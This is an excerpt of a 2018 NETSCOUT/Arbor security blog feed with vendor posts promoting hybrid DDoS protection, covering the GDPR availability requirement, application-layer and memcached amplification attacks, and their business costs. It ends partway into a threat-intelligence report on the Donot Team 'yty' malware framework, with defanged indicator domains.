    <pubDate>Tue, 27 Mar 2018 17:25:40 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>DDoS Managed Service</title>
  <link>http://localhost:7996/blog/cdn-ddos</link>
  <description>Among the options available for protection against DDoS attacks, some enterprises turn to content delivery networks or CDNs — globally distributed networks serving web content such as streaming video to end users. Being distributed in nature and having bandwidth to spare, some CDNs offer DDoS protection for the services they host as well as for service providers (ISPs) and...</description>
  <content:encoded><![CDATA[<p>Among the options available for protection against DDoS attacks, some enterprises turn to content delivery networks or CDNs — globally distributed networks serving web content such as streaming video to end users.</p>

<p>Being distributed in nature and having bandwidth to spare, some CDNs offer DDoS protection for the services they host as well as for service providers (ISPs) and enterprises outside their networks. While this may be a viable option in some cases, or as part of a broader multi-layered protection strategy, companies considering CDNs should be aware of their drawbacks compared to a dedicated, <a href="https://www.netscout.com/blog/managed-ddos-service" target="_blank">managed DDoS service</a>.</p>

<p>For one thing, security and DDoS protection is not a CDN provider’s primary focus. Its core business is content and application delivery. Attack investigation, development of countermeasures, and <a href="https://www.netscout.com/global-threat-intelligence">threat intelligence</a> are at best secondary considerations. Moreover, CDN providers may lack the resident expertise to research, analyze, and understand the nature of attacks, and make informed recommendations to bolster security. </p>

<p>Understandably, a CDN’s first protection priority will be the services it is hosting. In the event of an overwhelming, <a href="https://www.netscout.com/blog/dawn-terrorbit-era">super-sized attack</a> — the kind that is occurring more and more these days — a CDN may not have the capacity to protect all its customers’ assets and is bound to leave some exposed. CDN automated countermeasures are also known to block legitimate traffic at times. And because CDN DDoS mitigation strategies frequently utilize static filters and web application firewalls (WAFs), they may lack flexibility and intelligence in protecting cloud-based services.</p>

<h2>CDN DDoS: “Always On” Is Not Always Good</h2>

<p>CDNs promise “always on” protection, which sounds good, but raises some issues on closer inspection. “Always on” can mean one of two things: either traffic is constantly going through mitigation systems that actively inspect and automatically trigger blockage (“always mitigated”), or traffic is simply monitored and passively inspected in order to detect possible attacks and activate mitigation actions on-demand (“always monitored”). It’s important to understand the distinction and which one the provider is delivering.</p>

<p>If it’s “always mitigated,” you need to assess the balance between maximum mitigation of attacks and minimum impact on legitimate traffic. False positives are not the only possible collateral damage of always-on mitigation. Services can be delayed by unnecessary traffic inspection.  In the case of “always monitored,” you risk losing visibility into attack detection policies and reaction times. You might avoid unnecessary mitigation, but on the flip side, miss relevant attack indicators. Moreover, an always-on solution designed to detect volumetric attacks is likely to miss application layer attacks, which are smaller in scale.</p>

<p>“Always on” protection models require complex traffic balancing in order to mitigate <a href="https://www.netscout.com/what-is-ddos" target="_blank">DDoS attacks</a> while preserving normal operations for all customers. This is not trivial, given the large scale of attacks recently observed, and might result in either mitigation impact on non-attacked customers or in the segregation of attacked customers into sub-sets of the total CDN capacity. Customers should carefully assess whether an always-on provider has the scalable architecture to mitigate attacks on some customers without affecting others.</p>

<h2>A Hybrid DDoS Solution</h2>

<p>Increasingly, industry analysts and experts are pointing to <a href="https://www.netscout.com/ddos-protection" target="_blank">hybrid security solutions</a> as best-practice <a href="https://www.netscout.com/what-is-ddos">DDoS protection</a>. A hybrid strategy combines an always-on on-premise, dedicated detection, and mitigation system with on-demand cloud-based mitigation capabilities. Most attacks are still small enough to be detected and mitigated locally. A local appliance will also be more familiar with application traffic than a CDN DDoS solution, and therefore better able to recognize anomalies in traffic patterns. <a href="https://www.netscout.com/product/arbor-cloud">Cloud-based DDoS mitigation</a> is automatically triggered only when an attack clearly exceeds the capacity of the on-premise unit. Accordingly, there is no reason for the cloud component to be “always on,” saving on costs and conserving capacity to fight actual attacks.</p>

<p>Cost may be one of the key drivers to CDN DDoS providers. However, a hybrid solution can be surprisingly economical. Virtualization technology can replace expensive hardware. And when deployed as a fully managed service, backed by DDoS experts, the costs of a hybrid solution can be offset by a reduced internal IT footprint and security staffing needs.</p>

<p>Finally, a CDN solution typically relies heavily on automation.  Attackers today are cunning and creative. While <a href="https://www.netscout.com/blog/ddos-attack-automation" target="_blank">automated detection and mitigation capabilities</a> are absolutely essential, thwarting attacks also requires a team of people with the experience, training to outthink and outsmart malicious actors. A powerful threat intelligence network and deep research program will multiply the effectiveness of a hybrid technology solution many times over — strengths you are more likely to find with a dedicated DDoS security specialist than at a typical CDN provider, where security is a sideline.</p>

<p>What’s more, a hybrid solution is less expensive and a better value than you might think. These days, on-premise defenses can be virtualized. With a <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="48d3c411-f561-4a22-b12a-aa3b9dcbfd69" href="http://localhost:7996/product/arbor-managed-services" title="Arbor Managed DDoS Protection Services">fully managed DDoS service</a>, costs are offset by a reduction in staffing requirements. And you only pay for as much cloud capacity you consume.</p>

<p>To learn more, check out NETSCOUTs fully managed <a href="https://www.netscout.com/ddos-protection" target="_blank">hybrid DDoS solution</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/CDNvHybrid%201200x480.jpg" length="345736" type="image/jpeg"/>
    <guid isPermaLink="false">9cfff93a-d8fa-49ea-b91e-c8abbb769435</guid>
    <pubDate>Mon, 26 Mar 2018 14:16:56 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>GDPR Has Changed the Stakes for Network Availability</title>
  <link>http://localhost:7996/blog/gdpr-has-changed-stakes-network-availability</link>
  <description>Much of the discussion about GDPR focuses on the sticker shock of potential fines, which are only part of the significant changes this regulation introduces for businesses that collect or process personal data. Overshadowed by this discussion is a key provision at the heart of GDPR, Article 32, the Security of Processing: “ (b) the ability to ensure the ongoing confidentiality...</description>
  <content:encoded><![CDATA[<p>Much of the discussion about GDPR focuses on the sticker shock of potential fines, which are only part of the significant changes this regulation introduces for businesses that collect or process personal data.</p>

<p><em>Overshadowed by this discussion is a key provision at the heart of GDPR, Article 32, the Security of Processing: “</em></p>

<p><em>(b) the ability to ensure the ongoing confidentiality, integrity, availability and resilience of processing systems and services; (c) the ability to restore the availability and access to personal data  in a timely manner in the event of a  physical or technical incident;” And if the meaning of availability is not clear enough, GDPR Recital 49 specifies that a legitimate interest of the data controller in protecting their networks is “stopping ‘denial of service’ attacks and damage to computer and electronic communication systems.”</em></p>

<p>Avoiding 20,000,000 EUR or 4% of your annual turnover in fines is a surefire motivator. And protecting the availability of your network is part of GDPR. Availability has also become a business imperative — above and beyond regulatory compliance.</p>

<p>Organizations from commercial banks to online gaming, from retail operations to utilities increasingly rely upon the consistent, always on connections to their customers, partners and supply chain. Furthermore, the <a href="https://www.mckinsey.com/industries/financial-services/our-insights/a-roadmap-for-a-digital-transformation">digital transformation</a> of virtually any business looking to the future is predicated on network availability and reliability.</p>

<p>That availability is under increasing threat from more frequent, larger and more sophisticated <a href="https://www.arbornetworks.com/research/what-is-ddos">distributed denial of service (DDoS) attacks</a>. According to Arbor’s 13th Annual Worldwide Infrastructure Security Report, the number of attacks increased significantly in 2017. Arbor’s ATLAS observed 7.5 million <a href="https://www.arbornetworks.com/research/what-is-ddos">DDoS attacks</a> in 2017 (vs. 6.8 million in 2016). That equates to over twenty thousand DDoS attacks per day or 850 attacks per hour.</p>

<p>Part of this is due to low cost, attack for hire services. In fact, with cheaper services and widely available attack tools, launching a DDoS attack has been democratized. In GDPR-speak, this is significant to controller and processor organizations because it means anyone with an internet connection and a grievance can attack your availability.</p>

<p>Attack size is also a factor. In <a href="https://www.arbornetworks.com/report/">NETSCOUT Arbor’s’ 13th Annual Worldwide Infrastructure Security Report (WISR)</a> about one third of respondents reported peak attack sizes over 100 Gbps. The largest attack reported was 600 Gbps. This year, the percentage of attacks over 1 Gbps has increased to 22 percent, growing three years in a row.</p>

<p>To make matters worse, the modern DDoS attack is frequently a sophisticated combination of volumetric, TCP state exhaustion and application-layer attack <a href="https://www.arbornetworks.com/blog/insight/not-ddos-attacks-huge-volumetric-ddos-flood-attacks-affect-layers-3-4/">vectors</a>.</p>

<p>It seems that attackers are realizing that size doesn’t matter, but stealth does. According to Arbor’s WISR 2018 the percentage of volumetric attacks dropped from 60% in 2016 to 52% in 2017. However low and slow, harder to detect application layer attacks rose from 25% in 2016 to 32% in 2017.  The top applications being targeted were HTTP/S, DNS and new comers email and VOIP.</p>

<p>It is a common misconception that devices such as firewalls, WAFs, load balancers, and IPS/IDSs can mitigate DDoS attacks and keep you GDPR compliant. The fact is these stateful devices can become part of the problem. TCP state-exhaustion attacks exploit TCP protocols: SYN, FIN, and RST floods, with much smaller attacks than volumetric but enough to consume the device’s available memory. Commonly targeted devices include firewalls, IPSs, load balancers and servers. According to Arbor’s WISR 2018 report 52 percent reported their firewalls or IPS/IDS devices experienced or contributed to a network outage during a DDoS attack.</p>
<img alt="GDPR 1" data-entity-type="file" data-entity-uuid="d4e09055-768d-4cf6-8c8c-33bdb9fd51e6" src="http://localhost:7996/sites/default/files/inline-images/GDPR%20chart%201.JPG" class="align-center" /><p> </p>
<img alt="GDPR 2" data-entity-type="file" data-entity-uuid="3d2fff1c-2138-4a3b-9962-e419ef378a7e" src="http://localhost:7996/sites/default/files/inline-images/GDPR%20chart%202.JPG" class="align-center" /><img alt="GDPR 3" data-entity-type="file" data-entity-uuid="c78c7f58-1943-464a-9ce7-3078c75220f4" src="http://localhost:7996/sites/default/files/inline-images/GDPR%20chart%203.JPG" class="align-center" /><p> </p>

<p><strong>Best Practice DDoS Defense</strong></p>

<p>To stop the modern-day DDoS attack consisting of a dynamic combination of volumetric, TCP state exhaustion and application layer attack vectors, industry best practices recommend a layered, intelligently automated protection strategy backed by continuous, timely threat intelligence.</p>

<p>The heart of Arbor’s approach to DDoS protection <a href="https://www.arbornetworks.com/global-threat-intelligence-products">is global threat intelligence</a>.  With 400 customers sharing traffic data, we have visibility into approximately 1/3 of all internet traffic.</p>

<p>This gives us a unique position to monitor <a href="https://www.arbornetworks.com/stakes">botnets and IoT compromise activities</a> that drive DDoS attack activity. ATLAS intelligence is derived from the infiltration of these botnets, watching their development, monitoring their C&amp;C infrastructure, malware campaigns, and current vertical and regional targeting.</p>

<p><a href="https://www.arbornetworks.com/ddos-protection-products/arbor-aps">Arbor’s DDoS Protection solution</a> offers an intelligently automated combination of this global threat intelligence with in-cloud and on-premise DDoS attack protection products and/or services:</p>

<ul><li><a href="https://www.arbornetworks.com/ddos-protection-products/arbor-aps">Arbor APS</a> to stop in-bound network, application-layer and state exhaustion attacks on-premise, in front of firewalls and key communication gateways.</li>
	<li>Cloud Signaling™ to intelligently link to in-cloud mitigation before on-premise protection and internet circuits are overwhelmed with large attacks.</li>
	<li>Arbor Cloud and 24/7 SOC to mitigate volumetric attacks upstream before on-premises gateways and security systems are overwhelmed.</li>
	<li><a href="https://www.arbornetworks.com/research/security-intelligence">ATLAS Intelligence Feed</a> to continuously feed all mitigation options to stay protected from the latest threats. (e.g., <a href="https://www.arbornetworks.com/blog/asert/mirai-iot-botnet-description-ddos-attack-mitigation/">Mirai botnet</a> derivatives).</li>
</ul><p>So, with all the attention on protecting personal information, don’t forget one of the basics of GDPR compliance: keeping your systems available and resilient. After all, it would be hard to demonstrate compliance — and avoid those fines — if your systems were down.</p>

<p>To learn more about how NETSCOUT Arbor DDoS attack protection products and services can help you meet the availability protection requirements, <a href="https://pages.arbornetworks.com/GLBL-DDOS-2018_FY-2H-Banking-Multitouch-Program_GDPR_DDoS_Overview.html">download our GDPR checklist</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/GDPR%20feature%20image%201200x480.jpg" length="530972" type="image/jpeg"/>
    <guid isPermaLink="false">4be0f617-6518-49a6-9fdf-e2f650d73fa2</guid>
    <pubDate>Wed, 21 Mar 2018 13:50:44 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>503 “Service Unavailable”…Busy Server or DDoS Attack?</title>
  <link>http://localhost:7996/blog/503-service-unavailablebusy-server-ddos-attack</link>
  <description>Busy server? Maybe not. A "service unavailable" notification could be the result of an application-layer DDoS attack targeting your servers and critical infrastructure.</description>
  <content:encoded><![CDATA[<p>503 “Service Unavailable” …ever receive this error code from one of your web servers?</p>

<p>How about this in your log files?</p>

<p>TCP        192.168.3.102:34678                     91.128.45.2:443               ESTABLISHED</p>

<p>TCP        192.168.3.102:34680                     198.23.78.45:80               ESTABLISHED</p>

<p>TCP        192.168.3.102:34685                     40.33.75.45:443               TIME_WAIT</p>

<p>TCP        192.168.3.102:34696                     40.33.75.45:443               TIME_WAIT</p>

<p>TCP        192.168.3.102:34705                     91.13.15.23:443               TIME_WAIT</p>

<p>TCP        192.168.3.102:34715                     91.13.15.23:443               TIME_WAIT</p>

<p>Busy server? Maybe not. A "service unavailable" notification could be the result of an application-layer DDoS attack targeting your servers and critical infrastructure.</p>

<h3>What is an application-layer DDoS attack?</h3>

<p>The modern-day <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="4dbce3cf-7733-47a9-96be-6afc3fa09c28" href="http://localhost:7996/what-is-ddos" title="DDoS Protection 101: What Is DDoS?">DDoS attack</a> is complex as it typically executes a dynamic combination of Volumetric, TCP-State Exhaustion and Application-layer attack vectors. And according to <a href="https://www.netscout.com/report/" target="_blank">NETSCOUT's annual Worldwide Infrastructure Security Report</a> (WISR), application-layer attacks are on the rise. </p>

<p><img alt="DDoS Server Attack Example" class="align-center" data-entity-type="file" data-entity-uuid="f88413df-e43b-4535-b81a-f45cc99f5693" src="http://localhost:7996/sites/default/files/inline-images/503%20unavailable%20image.jpg" /></p>

<p> </p>

<p>As the graphic above shows, each attack vector has a specific goal in mind.</p>

<p>Volumetric attacks are designed to saturate bandwidth, internet facing router interfaces, circuits etc. These types of attacks can be quite large (up to 600 Gbps). According to the WISR, volumetric attacks make up 52% of all DDoS attacks – interestingly this is a drop from 60% in 2016.</p>

<p>TCP-state exhaustion attacks are designed to take out, what’s in many cases, an organization’s first line of defense; meaning their firewalls, IPS, etc.</p>

<p>Application-layer attacks are designed to target and exhaust resources in application servers using commands like HTTP GET, PUT etc. The number of application-layer attacks is increasing. For example, in 2017, 32% of all DDoS attacks were application-layer attacks vs. 25% in 2016. As in years past, top targeted applications were HTTP, HTTPS, and DNS. However, this year’s report indicated a rise in new targets such as email and SIP/VoIP applications.</p>

<h3>Why are application-layer DDoS attacks on the rise?</h3>

<p>What’s driving this?  Well one reason is that attackers <a href="https://www.netscout.com/blog/largest-ddos-attack-service-shut-down">and DDoS Services </a>believe in the old adage “size isn’t everything.”  “Stealth” is just as important. Attackers understand that unlike volumetric attacks which draw attention, application-layer attacks are “low and slow”; meaning they consume very little bandwidth and normally fly under the radar of traffic management systems - yet the results can be just as impactful.</p>

<h3>How to prevent DDoS attacks in your servers</h3>

<p>The NETSCOUT Arbor APS (APS) is an industry leading <a href="https://www.netscout.com/product/arbor-availability-protection-system">DDoS attack protection device </a>that can stop all types of DDoS attacks. In fact, APS excels at automatically detecting and stopping application layer attacks. So, the next time you see:</p>

<p>“503- Service Unavailable” or TIME-WAIT</p>

<p>Don’t just assume it’s a busy server – you may be under a DDoS attack.</p>

<p>For more information about NETSCOUT Arbor APS product, visit <a href="https://www.netscout.com/product/arbor-availability-protection-system" target="_blank">here</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/503%20unavailable%201200x480.jpg" length="56654" type="image/jpeg"/>
    <guid isPermaLink="false">bb005a0d-18ed-496e-99f9-47f586be8488</guid>
    <pubDate>Mon, 19 Mar 2018 14:31:23 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>The Consequences of DDoS Attacks are Rising</title>
  <link>http://localhost:7996/blog/consequences-ddos-attacks-are-rising</link>
  <description>What is at risk in a DDoS attack on an enterprise website or network? Certainly, there is a financial risk, as revenue will likely be lost as a direct result of the attack. There is the cost of remediation, and affected customers may have to be compensated. There is a legal risk if confidential user data is compromised. Service providers may face financial and legal...</description>
  <content:encoded><![CDATA[<p>What is at risk in a DDoS attack on an enterprise website or network? Certainly, there is a financial risk, as revenue will likely be lost as a direct result of the attack. There is the cost of remediation, and affected customers may have to be compensated. There is a legal risk if confidential user data is compromised. Service providers may face financial and legal consequences if they have failed to live up to their SLAs. Then there are intangibles, such as damage to a company’s brand or reputation that will show up down the road in the form of a lost business and falling stock prices.</p>

<p>The consequences of DDoS attacks are severe – and getting worse, according to <a href="https://www.netscout.com/report/">NETSCOUT Arbor’s 13<sup>th</sup> annual Worldwide Infrastructure Security Report (WISR)</a>. The number of survey respondents reporting revenue loss as a business impact of <a href="https://www.netscout.com/what-is-ddos">DDoS attacks</a> nearly doubled in 2017. Those who reported the cost of internet downtime at $501 to $1,000 per minute increased by nearly 60%. Around 10% of enterprises experienced an attack with an estimated cost greater than $100,000, five times more than the previous year. More than half of respondents experienced a financial impact between $10,000 and $100,000, almost twice as many as in 2016. And 57% cited damage to their reputation or brand as the primary business impact of an attack.</p>

<h2>Rising C-Level Threat Awareness</h2>

<p>As DDoS risks are rising, however, so is management awareness. <a href="https://www.netscout.com/blog/largest-ddos-attack-service-shut-down">High-profile DDoS attacks</a> have led to a better understanding of the threat at the executive level. In 2017, 77% of enterprises reported that DDoS was either a part of their business or their IT risk assessments. This is a positive and encouraging trend. It indicates that business leaders are recognizing <a href="https://www.netscout.com/what-is-ddos">DDoS protection</a> as a risk management issue.</p>

<p>Companies devote substantial resources and expertise to managing their financial, regulatory, business and market risks and exposure. It’s time to adopt the same posture toward their cyber-security risks, particularly as more of their business goes online, or is dependent on networks connected to the public internet. Do you have the controls in place to ensure continuous service availability and mitigate against the financial, legal and reputational risks that a DDoS attack poses?</p>

<h2>More Digital, More Vulnerable</h2>

<p>A buzz phrase we hear a lot these days is <a href="https://www.netscout.com/solutions/digital-transformation">“digital transformation.”</a> Businesses are investing in technologies that make their operations more efficient through automation, virtualization, the cloud and connectivity. Many are creating new, digitally powered business models that would not have been possible without the convergence of these technologies. Yet security measures are not always keeping pace with this transformation. <a href="https://www.netscout.com/solutions/iot-monitoring">Internet of Things (IoT)</a>, applications, networks and devices are proliferating faster than efforts to secure them, making them ripe targets for attackers. The very technologies that make service delivery more efficient also make enterprises more vulnerable to attacks.</p>

<p>Part of the reason attacks are becoming increasingly devastating is that they are growing in size and complexity. Actors may employ a combination of attack methodologies and strike different attack vectors. Today’s multi-layer threats might combine a large-scale volumetric attack, which seeks to overwhelm bandwidth through sheer force, with stealthy attack targeting some aspect of an application or service at Layer-7. These are the deadliest kind of attacks as they can be very effective with as few as one attacking machine generating a low traffic rate (this makes these attacks very difficult to proactively detect and mitigate).</p>

<h2>Multi-Layered Attacks Call for A Multi-Layered Defense</h2>

<p>Effective DDoS protection requires countermeasures against any and all types of threats. A fully managed <a href="https://www.netscout.com/ddos-protection">hybrid DDoS solution</a>, integrating dedicated on-premise protection with cloud-based mitigation capabilities, is widely considered best practice in DDoS defense. The on-premise component provides sufficient detection and mitigation capabilities against the vast majority of attacks, including application-layer and state-exhaustion attacks which target firewall, IPS and other stateful infrastructure. The <a href="https://www.netscout.com/product/arbor-cloud">cloud component</a> is needed to provide the capacity to counteract large volumetric attacks, which are escalating as high as 600 to 800 Gbps in size. In the hybrid scenario, the two components are intelligently integrated so that cloud mitigation is automatically activated when an attack reaches a designated threshold.&nbsp;</p>

<p>This year’s WISR data underscores the mounting consequences of DDoS attacks – lost revenue, lost customers and lost credibility. An investment in dedicated DDoS protection is an effective hedge against one of your business risks: the loss of service availability and the rippling consequences that result.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Consequences%201200x480_0.jpg" length="840849" type="image/jpeg"/>
    <guid isPermaLink="false">b9575a6b-775d-4022-8528-803921c7d0df</guid>
    <pubDate>Wed, 14 Mar 2018 12:41:14 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>No Sooner Did the Ink Dry: 1.7Tbps DDoS Attack Makes History</title>
  <link>http://localhost:7996/blog/security-17tbps-ddos-attack-makes-history</link>
  <description>In January 2018, NETSCOUT Arbor published our 13th Annual Worldwide Infrastructure Report (WISR 2018). This year’s report noted that the largest DDoS attack was 650 Gbps; which was down from the prior year of 800 Gbps. The report also noted that though the largest DDoS attack was 650Gbps, the overall mix of attack sizes is still shifting up. For example, this year the...</description>
  <content:encoded><![CDATA[<p>In January 2018, NETSCOUT Arbor published our 13<sup>th</sup> Annual Worldwide Infrastructure Report (WISR 2018). </p>

<p>This year’s report noted that the largest DDoS attack was 650 Gbps; which was down from the prior year of 800 Gbps.  The report also noted that though the largest DDoS attack was 650Gbps, the overall mix of attack sizes is still shifting up.  For example, this year the percentage of attacks over 1 Gbps has increased to 22%, growing three years in a row.</p>

<p>No sooner had the ink dried on WISR 2018 did we encounter a 1.7Tbps DDoS attack!</p>

<p>On March 5<sup>th</sup> 2018, NETSCOUT Arbor’s ATLAS global traffic and DDoS threat data system confirmed a 1.7Tbps reflection/amplification attack that targeted a customer of a U.S.-based service provider.</p>
<img alt="memcached 1" data-entity-type="file" data-entity-uuid="2adca769-e2e4-4ff0-b36b-4b6d34183792" src="http://localhost:7996/sites/default/files/inline-images/memcached%201.jpg" class="align-center" /><p> </p>

<p>The attack utilized a Memcached (pronounced <em>mem-cash-dee</em>) Reflection &amp; Amplification vector to accomplish such a massive attack.</p>

<p>Though Memcached reflection and amplification attacks are not new, the abrupt rise in the number and size of these attacks indicates the weaponization of this technique has occurred. In other words, now this technique is in the hands of less sophisticated attackers who now simply utilize a DDoS for Hire Boot Stresser service to launch such an attack.</p>

<p><strong>How did the DDoS attack occur?</strong></p>

<p>To learn more about the technical details of the Memcached Reflection and Amplification attacks and ways to stop them, visit our ASERT Blog:</p>

<p><a href="https://www.arbornetworks.com/blog/asert/memcached-reflection-amplification-description-ddos-attack-mitigation-recommendations">https://www.arbornetworks.com/blog/asert/memcached-reflection-amplification-description-ddos-attack-mitigation-recommendations</a></p>

<p>But the truth is, not all DDoS attacks are that large. In fact, the vast majority (87%) of DDoS attacks are under 2 Gbps.</p>
<img alt="memcached 2" data-entity-type="file" data-entity-uuid="c1b26849-1f26-428c-a7f6-b4bc3002172b" src="http://localhost:7996/sites/default/files/inline-images/memcached%202.jpg" class="align-center" /><p> </p>

<p>And the modern day DDoS attack is complex as it deploys a dynamic combination of at least three different attack vectors.</p>

<p>First, volumetric attacks, like the memcached attacks which can reach Terabits in size, are designed to saturate bandwidth. According to Arbor’s WISR 2018, 52% of attacks are volumetric.</p>

<p>Second, TCP state exhaustion attacks are designed to take out your first lines of defense such as firewalls or IPS devices. According to Arbor’s WISR 2018, 16% of attacks are TCP State Exhaustion.</p>

<p>And last but not least, low and slow, very difficult to detect application-layer attacks are designed to bring down critical applications.  According to Arbor’s WISR 2018, 32% of attacks are application-layer attacks, which is up 26% from last year.</p>

<p>The attackers use all three of these attack vectors simultaneously, making it very difficult to defend against.</p>

<p><strong>Best Practices to Stop These Kinds of Attacks</strong></p>

<p>Industry best practices dictate, you need to take a layered or hybrid approach to stop multi-vector DDoS attacks. In other words…</p>

<p>To stop volumetric attacks (that only need to be as large as your internet pipe)…</p>
<img alt="memcached 3" data-entity-type="file" data-entity-uuid="e0c15c98-51b2-4007-9942-2cb868d8350a" src="http://localhost:7996/sites/default/files/inline-images/memcached%203.jpg" class="align-center" /><img alt="memcached 4" data-entity-type="file" data-entity-uuid="736ac3ae-d17d-463b-97f0-f9402324e99c" src="http://localhost:7996/sites/default/files/inline-images/memcached%204.jpg" class="align-center" /><p> </p>

<p>Your only option is the cloud. You need the help of your Internet Service Provider or a cloud-based DDoS protection service provider to reroute attack traffic to their cloud based scrubbing centers.</p>

<p>For TCP state exhaustion or low and slow application layer attacks which are more difficult to detect and stop with a cloud-only based solution…</p>

<p>The best option for protection is on your premises. That is, deploy DDoS protection in the most critical data centers.</p>

<p>Customize policies for applications running in those data centers.</p>

<p>And install in front of firewalls to protect them from TCP-state exhaustion attacks.</p>

<p>NETSCOUT Arbor’s solution is an intelligently automated, seamlessly integrated combination of on-premise and in-cloud DDoS attack protection; continuously backed by global visibility and threat intelligence.</p>
<img alt="memcached 5" data-entity-type="file" data-entity-uuid="64077a1d-d755-4a8c-ad24-a2e47c0293ce" src="http://localhost:7996/sites/default/files/inline-images/memcached%205.jpg" class="align-center" /><ol><li>On the premise, the Arbor APS product is an in-line, always on product that can automatically detect and stop all types of DDoS attacks – especially application layer attacks which it excels at.</li>
	<li>In the event of a large attack, via a feature called Cloud Signaling, the Arbor APS will automatically redirect attack traffic to the Arbor Cloud.</li>
	<li>Arbor Cloud is a fully managed DDoS attack protection service offering multiple Tbps of mitigation capacity via worldwide scrubbing centers. </li>
	<li>All of these products and services are continuously armed with the global threat intelligence offered by Arbor’s ATLAS and Security Engineering and Response Team (ASERT).</li>
</ol><p>So, don’t let the headlines influence you. Yes, DDoS attacks are getting large (e.g. 1.7Tbps Memcached attacks), but they are also getting more complex. Comprehensive protection requires an intelligently automated, seamlessly integrated combination of on-premise and <a href="https://www.arbornetworks.com/ddos-protection-products/arbor-cloud">in-cloud DDoS attack protection</a>; continuously backed by global visibility and threat intelligence.</p>

<p>For more information on Memcached attacks, take a look at this video, <a href="https://pages.arbornetworks.com/GLBL-DDOS-20180307-Memcached-Update_What-is-a-Memcached-DDoS-Attack-and-How-Can-You-Stop-It.html">What is a Memcached DDoS Attack? And How You Can Stop It</a></p>

<p>For more detailed information about NETSCOUT Arbor DDoS Attack Protection products and services, visit <a href="http://www.arbornetworks.com">www.arbornetworks.com</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Featureimage%20memcached%201200x480jpg.jpg" length="708358" type="image/jpeg"/>
    <guid isPermaLink="false">04a16822-7c2f-4909-b3be-20bdd36c97b7</guid>
    <pubDate>Mon, 12 Mar 2018 13:37:40 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Donot Team Leverages New Framework</title>
  <link>http://localhost:7996/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia</link>
  <description>Authors: Dennis Schwarz and Jill Sopko Special thanks to Richard Hummel and Hardik Modi for their contributions on this post. Figure 1: Pakistan themed decoy document Key Findings ASERT discovered a new modular malware framework, we call yty, that focuses on file collection, screenshots, and keylogging. We believe the threat actors, Donot Team, who created EHDevel, also created...</description>
  <content:encoded><![CDATA[<p>Authors: Dennis Schwarz and Jill Sopko</p>

<p><em>Special thanks to Richard Hummel and Hardik Modi for their contributions on this post.</em> </p>

<p><a href="http://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/decoy_doc-2/" rel="attachment wp-att-9509"><img alt="" class="size-full wp-image-9509" height="397" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/decoy_doc-1.png" width="535" /></a> <img alt="Pakistan themed decoy document" data-entity-type="file" data-entity-uuid="f5502197-9338-432d-b653-1f0488766395" src="http://localhost:7996/sites/default/files/inline-images/decoy_doc-1.png" /></p>

<p>Figure 1: Pakistan themed decoy document</p>

<h2>Key Findings</h2>

<ul><li>ASERT discovered a new modular malware framework, we call yty, that focuses on file collection, screenshots, and keylogging.</li>
	<li>We believe the threat actors, Donot Team, who created EHDevel, also created the yty framework.</li>
	<li>With medium confidence, ASERT believes this new malware framework will pick up where EHDevel left off and continue to focus on targets in South Asia.</li>
</ul><h2>Overview</h2>

<p>In late January 2018, ASERT discovered a new modular malware framework we call "yty". The framework shares a striking resemblance to the EHDevel framework. We believe with medium confidence that a team we call internally as "Donot Team" is responsible for the new malware and will resume targeting of South Asia.</p>

<p>In a likely effort to disguise the malware and its operations, the authors coded several references into the malware for football—it is unclear whether they mean American football or soccer. The theme may allow the network traffic to fly under the radar.</p>

<p>While we believe this framework and its components are new, it shares many Tactics, Techniques, and Procedures (TTPs) and Indicators of Compromise (IOCs) with the EHDevel malware framework. In September 2017, Bitdefender released a <a href="https://www.bitdefender.com/blog/labs/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/">white paper</a> describing EHDevel and some of the campaigns that used it. Some of the highlights of it included the following:</p>

<ul><li>Labeled as an APT (advanced persistent threat) and active since at least 2016.</li>
	<li>Modular architecture with malware functionality spread over multiple components.</li>
	<li>Components used a variety of programming languages (C++, .NET, Python, VBS, and AutoIt).</li>
	<li>Functionality included: file collection, screenshots, key logging, and gathering system information.</li>
	<li>Command and control (C2) hosts stored in a document hosted on Google Docs.</li>
	<li>Decoy documents, timestamp analysis, and C2 server log analysis showed a focus on Pakistan.<strong> </strong></li>
</ul><p>We assess with medium confidence that the yty framework is a replacement for the EHDevel framework and that the Donot Team may start using it in campaigns in a similar manner as EHDevel. The evolution from EHDevel to yty shows the threat actors are continually improving and modifying their malware framework, adding to their sophistication.</p>

<h2>Campaign Analysis</h2>

<p>Donot Team campaigns use multiple methods to mimic legitimate applications, organizations, and services like Adobe, Gmail or news outlets. They also including seemingly benign domains that likely raise minimal suspicion to a human observer. The following domains are a few examples:</p>

<ul><li>abodeupdater[.]com
	<ul><li>Adobe update services</li>
	</ul></li>
	<li>qmails[.]org
